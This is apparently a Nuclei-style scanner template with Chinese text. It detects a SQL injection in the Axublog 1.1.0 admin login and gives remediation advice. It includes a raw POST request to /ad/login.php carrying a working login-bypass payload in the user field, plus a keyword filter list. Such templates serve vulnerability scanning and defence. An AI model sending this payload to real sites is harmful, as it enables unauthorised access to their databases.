id: axublog-adlogin-sql-injection
info:
  name: axublog-v1-ad-sqli
  author:
  - jim2g
  description: |-
    axublog-adlogin-sql-injection存在SQL注入漏洞
    Axublog 1.1.0 c_login.php存在sql注入漏洞
    Axublog是一款PHP个人博客系统。 Axublog（ad_login.php）存在SQL注入漏洞。攻击者可利用漏洞，
    直接进行注入，获取数据库敏感信息。
  severity: high
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.axublog.com
    临时修复方案：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: dsl
    condition: and
    dsl:
    - status_code==200
    - contains(body,"{\"jieguo\":\"<div id=redmsg")
  raw:
  - |
    POST /ad/login.php?g=jsloginpos HTTP/1.1
    Host: {{Hostname}}
    Cookie: __cfduid=de849234b2b1ebb8238fde063eb9788031515120516; pgv_pvi=3314177024; UM_distinctid=164ac358c869-0ac3fa0f7532048-4c322f7c-1fa400-164ac358c873ea; CNZZDATA1260680534=1606885371-1532334996-http%253A%252F%252Fkb.seclover.com%252F%7C1532334996; PHPSESSID=0018fd6d0e814ea70f12ce5acbe15c01

    user=1'+or+1%23&psw=11&loginlong=86400"""
  req-condition: true
